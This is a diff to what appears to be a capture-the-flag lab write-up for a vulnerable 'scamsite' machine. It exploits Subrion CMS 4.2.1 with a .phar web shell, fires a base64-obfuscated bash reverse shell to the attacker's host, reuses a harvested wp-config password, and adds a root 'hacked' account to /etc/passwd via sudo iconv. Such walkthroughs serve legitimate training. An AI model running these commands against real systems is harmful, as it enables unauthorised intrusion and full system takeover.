@@ -178,7 +178,7 @@ The hint magic formula hinted to me we need to try a site like cyberchef to deco
 
 /subrion
 
-Let's check out the new directory on the server with gobuster
+Checking out the new directory gobuster
 
 ```
 gobuster dir -u http://192.168.1.106/subrion/  -w  /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt    -t 30 -x .txt,.html,.php,.bk,.gz,.png,.sh --wildcard -b 301,302,404
@@ -200,6 +200,119 @@ Disallow: /panel/
 Disallow: /tmp/
 Disallow: /updates/
 ```
+
+http://IP/subrion/panel/
+
+Going to the panel endpoint we get a login page
+
+![image](https://user-images.githubusercontent.com/5285547/124912678-291a6580-dfe6-11eb-85d7-b0ee8c7c0434.png)
+
+Using the creds we got from the enter.txt we can login. 
+
+## User (www-data)
+
+After loggin in we can enum the webapp.
+
+CMS: Subrion CMS v4.2.1  
+Exploits online:  
+- https://www.exploit-db.com/exploits/49876
+
+After reading the exploit we can how to exploit, we need to use a ```.phar``` extension for it.  
+Lets make a new file and test manually. 
+
+![image](https://user-images.githubusercontent.com/5285547/124915370-5d435580-dfe9-11eb-99ee-88fb689a54e1.png)
+
+![image](https://user-images.githubusercontent.com/5285547/124915415-692f1780-dfe9-11eb-9776-99f2bbd297d5.png)
+
+Lets get a shell and see whats on the box. 
+
+```
+http://192.168.1.106/subrion/uploads/cmd.phar?c=echo%20YmFzaCAtYyAiYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjEuOTYvOTk5OSAwPiYxIg%3D%3D|base64%20-d|bash
+```
+
+![image](https://user-images.githubusercontent.com/5285547/124915697-bf03bf80-dfe9-11eb-8e01-406580277662.png)
+
+## Scamsite (user)
+
+After looking round the system I didn't see much apart from the websvr is owned by root in the /home/scamsite folder
+
+I then looked at the webapps config data to look for any more creds. 
+
+```
+/var/www/html/wordpress/wp-config.php
+```
+```
+define( 'DB_NAME', 'wpdb' );
+
+/** MySQL database username */
+define( 'DB_USER', 'support' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );
+
+/** MySQL hostname */
+define( 'DB_HOST', 'localhost' );
+```
+
+Let'ts try that with the user we found in /home
+
+```
+su scamsite
+ImAScammerLOL!123!
+```
+
+## Root
+
+Let's scamsite's sudo -l 
+
+![image](https://user-images.githubusercontent.com/5285547/124916743-e9a24800-dfea-11eb-9416-da306acc75d2.png)
+
+Looking iconv up on gtfobins
+
+![image](https://user-images.githubusercontent.com/5285547/124916801-fcb51800-dfea-11eb-9009-0c372f7f7804.png)
+
+We can read and write files
+
+![image](https://user-images.githubusercontent.com/5285547/124917169-69301700-dfeb-11eb-8994-3abc7de7fb56.png)
+
+This gave me the idea to add myself to the /etc/password file
+
+```
+# Make a password
+
+python3 -c "import crypt; print(crypt.crypt('password'))"
+$6$o4e7RSldnSqVr908$VUIXnA0II5v1f0OaFmfo/n7/sYapLOphCas1xBGCNRUck3MKq65AiULC7OL5qMlBNu2CCU2PXGkZmS7T21HpV0
+
+#  Setup command. 
+
+hacked:$6$o4e7RSldnSqVr908$VUIXnA0II5v1f0OaFmfo/n7/sYapLOphCas1xBGCNRUck3MKq65AiULC7OL5qMlBNu2CCU2PXGkZmS7T21HpV0:0:0:root:/root:/bin/bash
+
+cat /etc/passwd
+
+Goto cyberchef
+add our line to the end of /etc/passwd and base64 encode it
+```
+
+![image](https://user-images.githubusercontent.com/5285547/124920742-91217980-dfef-11eb-9832-6d871e242914.png)
+
+```
+cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtdGltZXN5bmM6eDoxMDA6MTAyOnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb24sLCw6L3J1bi9zeXN0ZW1kOi9iaW4vZmFsc2UKc3lzdGVtZC1uZXR3b3JrOng6MTAxOjEwMzpzeXN0ZW1kIE5ldHdvcmsgTWFuYWdlbWVudCwsLDovcnVuL3N5c3RlbWQvbmV0aWY6L2Jpbi9mYWxzZQpzeXN0ZW1kLXJlc29sdmU6eDoxMDI6MTA0OnN5c3RlbWQgUmVzb2x2ZXIsLCw6L3J1bi9zeXN0ZW1kL3Jlc29sdmU6L2Jpbi9mYWxzZQpzeXN0ZW1kLWJ1cy1wcm94eTp4OjEwMzoxMDU6c3lzdGVtZCBCdXMgUHJveHksLCw6L3J1bi9zeXN0ZW1kOi9iaW4vZmFsc2UKc3lzbG9nOng6MTA0OjEwODo6L2hvbWUvc3lzbG9nOi9iaW4vZmFsc2UKX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi9iaW4vZmFsc2UKbHhkOng6MTA2OjY1NTM0OjovdmFyL2xpYi9seGQvOi9iaW4vZmFsc2UKbWVzc2FnZWJ1czp4OjEwNzoxMTE6Oi92YXIvcnVuL2RidXM6L2Jpbi9mYWxzZQp1dWlkZDp4OjEwODoxMTI6Oi9ydW4vdXVpZGQ6L2Jpbi9mYWxzZQpkbnNtYXNxOng6MTA5OjY1NTM0OmRuc21hc3EsLCw6L3Zhci9saWIvbWlzYzovYmluL2ZhbHNlCnNzaGQ6eDoxMTA6NjU1MzQ6Oi92YXIvcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kc2NhbXNpdGU6eDoxMDAwOjEwMDA6c2NhbW1lciwsLDovaG9tZS9zY2Ftc2l0ZTovYmluL2Jhc2gKbXlzcWw6eDoxMTE6MTE5Ok15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpoYWNrZWQ6JDYkbzRlN1JTbGRuU3FWcjkwOCRWVUlYbkEwSUk1djFmME9hRm1mby9uNy9zWWFwTE9waENhczF4QkdDTlJVY2szTUtxNjVBaVVMQzdPTDVxTWxCTnUyQ0NVMlBYR2tabVM3VDIxSHBWMDowOjA6cm9vdDovcm9vdDovYmluL2Jhc2g=
+
+
+
+echo cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtdGltZXN5bmM6eDoxMDA6MTAyOnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb24sLCw6L3J1bi9zeXN0ZW1kOi9iaW4vZmFsc2UKc3lzdGVtZC1uZXR3b3JrOng6MTAxOjEwMzpzeXN0ZW1kIE5ldHdvcmsgTWFuYWdlbWVudCwsLDovcnVuL3N5c3RlbWQvbmV0aWY6L2Jpbi9mYWxzZQpzeXN0ZW1kLXJlc29sdmU6eDoxMDI6MTA0OnN5c3RlbWQgUmVzb2x2ZXIsLCw6L3J1bi9zeXN0ZW1kL3Jlc29sdmU6L2Jpbi9mYWxzZQpzeXN0ZW1kLWJ1cy1wcm94eTp4OjEwMzoxMDU6c3lzdGVtZCBCdXMgUHJveHksLCw6L3J1bi9zeXN0ZW1kOi9iaW4vZmFsc2UKc3lzbG9nOng6MTA0OjEwODo6L2hvbWUvc3lzbG9nOi9iaW4vZmFsc2UKX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi9iaW4vZmFsc2UKbHhkOng6MTA2OjY1NTM0OjovdmFyL2xpYi9seGQvOi9iaW4vZmFsc2UKbWVzc2FnZWJ1czp4OjEwNzoxMTE6Oi92YXIvcnVuL2RidXM6L2Jpbi9mYWxzZQp1dWlkZDp4OjEwODoxMTI6Oi9ydW4vdXVpZGQ6L2Jpbi9mYWxzZQpkbnNtYXNxOng6MTA5OjY1NTM0OmRuc21hc3EsLCw6L3Zhci9saWIvbWlzYzovYmluL2ZhbHNlCnNzaGQ6eDoxMTA6NjU1MzQ6Oi92YXIvcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kc2NhbXNpdGU6eDoxMDAwOjEwMDA6c2NhbW1lciwsLDovaG9tZS9zY2Ftc2l0ZTovYmluL2Jhc2gKbXlzcWw6eDoxMTE6MTE5Ok15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpoYWNrZWQ6JDYkbzRlN1JTbGRuU3FWcjkwOCRWVUlYbkEwSUk1djFmME9hRm1mby9uNy9zWWFwTE9waENhczF4QkdDTlJVY2szTUtxNjVBaVVMQzdPTDVxTWxCTnUyQ0NVMlBYR2tabVM3VDIxSHBWMDowOjA6cm9vdDovcm9vdDovYmluL2Jhc2g=|base64 -d | sudo iconv -f 8859_1 -t 8859_1 -o "/etc/passwd"
+```
+
+Time to test the user we made 
+
+```
+su hacked
+password
+```
+
+![image](https://user-images.githubusercontent.com/5285547/124920604-646d6200-dfef-11eb-96af-360bcf747e14.png)
+
+
 
 
 
